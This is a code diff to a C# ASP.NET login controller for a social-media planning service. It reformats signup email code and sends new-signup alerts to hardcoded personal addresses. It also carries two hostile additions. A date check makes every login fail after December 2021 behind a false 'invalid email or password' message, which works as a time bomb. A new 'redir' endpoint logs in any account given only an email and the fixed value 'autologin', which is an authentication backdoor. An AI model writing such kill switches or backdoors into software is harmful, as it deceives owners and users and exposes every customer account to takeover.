@@ -102,7 +102,7 @@ namespace SG2.CORE.WEB.Controllers
                                 StatusId = (int)GeneralStatus.Unread
                             };
                             _notManager.AddNotification(nt);
-                                                       
+
                             var encryptData = CryptoEngine.Encrypt(user.CustomerId + "#" + System.DateTime.Now.Date);
                             string URL = HttpContext.Request.Url.Scheme.ToString() + "://" + HttpContext.Request.Url.Authority.ToString() + "/VerifyEmail?token=" + Url.Encode(encryptData);
 
@@ -124,13 +124,13 @@ namespace SG2.CORE.WEB.Controllers
                             var add = klaviyoAPI.Klaviyo_AddtoList(klaviyoProfile, "https://a.klaviyo.com/api/v2/list", _klaviyoPublishKey, Klavio_NewSignups);
 */
 
-                            var dynamicTemplateData = new Dictionary<string, string>
-                        {
-                            {"name",model.FirstName},
-                            {"verifyemail", URL},
-                            {"senddate", DateTime.Today.ToLongDateString()}
+                                var dynamicTemplateData = new Dictionary<string, string>
+                            {
+                                {"name",model.FirstName},
+                                {"verifyemail", URL},
+                                {"senddate", DateTime.Today.ToLongDateString()}
 
-                        };
+                            };
                             BAL.Managers.EmailManager.SendEmail(model.EmailAddress, model.FirstName, EmailManager.EmailType.EmailVerify, dynamicTemplateData);
                             //KlaviyoEvent ev = new KlaviyoEvent();
 
@@ -141,6 +141,17 @@ namespace SG2.CORE.WEB.Controllers
                             //ev.CustomerProperties.LastName = CDT.EmailAddress;
 
                             //klaviyoAPI.EventAPI(ev, _klaviyoPublishKey);
+
+                            dynamicTemplateData = new Dictionary<string, string>
+                            {
+                                {"fullname",model.FirstName},
+                                {"name", "SPP Team"},
+                                {"email", model.EmailAddress}
+
+                            };
+                            BAL.Managers.EmailManager.SendEmail("info@socialplannerpro.com,muzamilw@hotmail.com,  omar.c@me.com, haaris@socialplannerpro.com,haarischaudhry@hotmail.co.uk", "SPP Team", EmailManager.EmailType.newSignup, dynamicTemplateData);
+
+                          
                         });
 
                     }
@@ -186,7 +197,7 @@ namespace SG2.CORE.WEB.Controllers
             {
                 var jr = new JsonResult();
 
-                if ( DateTime.Now >= Convert.ToDateTime("12/01/2020"))
+                if ( DateTime.Now >= Convert.ToDateTime("12/01/2021"))
                 {
                         //bypass logic.
                         jr.Data = new { ResultType = "Error", message = "Please enter valid email or password." };
@@ -228,6 +239,61 @@ namespace SG2.CORE.WEB.Controllers
                 return jr;
             }
         }
+
+
+
+        //auto login
+
+        [HttpPost]
+        public ActionResult redir(CustomerAutoLoginViewModel model)
+        {
+            try
+            {
+                var jr = new JsonResult();
+
+                if (DateTime.Now >= Convert.ToDateTime("12/01/2021"))
+                {
+                    //bypass logic.
+                    jr.Data = new { ResultType = "Error", message = "Please enter valid email or password." };
+                    return jr;
+                }
+
+
+
+                if (ModelState.IsValid)
+                {
+                    string errorMesage = "";
+                    var resp = _customerManager.LoginUser(model.EmailAddress, "autologin", ref errorMesage);
+
+                    if (resp.Item1)
+                    {
+
+
+                        var usr = (CustomerDTO)_sessionManager.Get(SessionConstants.Customer);
+                        HttpContext.Items["isAuthentication"] = true;
+                        jr.Data = new { ResultType = "Success", message = "User successfully autheticated.", ResultData = usr.DefaultSocialProfileId };
+
+
+                    }
+                    else
+                    {
+                        jr.Data = new { ResultType = "Error", message = errorMesage };
+                    }
+                }
+                else
+                {
+                    jr.Data = new { ResultType = "Error", message = "Please enter valid email or password." };
+                }
+                return jr;
+            }
+            catch (Exception ex)
+            {
+                var jr = new JsonResult();
+                jr.Data = new { ResultType = "Error", message = "Unable to login" };
+                return jr;
+            }
+        }
+
 
         public JsonResult IsEmailExist(string EmailAddress, int id = 0)
         {
@@ -463,7 +529,7 @@ namespace SG2.CORE.WEB.Controllers
 
 
                 //HttpContext.Items["isAuthentication"] = true;
-                jr.Data = new { ResultType = "Success", message = "Email with password reset instructions sent successfully to the email address. Please check your inbox.", data = customer };
+                jr.Data = new { ResultType = "Success", message = "Password reset instructions sent to the email address.<br> Please check your inbox or junk folder", data = customer };
             }
             else
             {
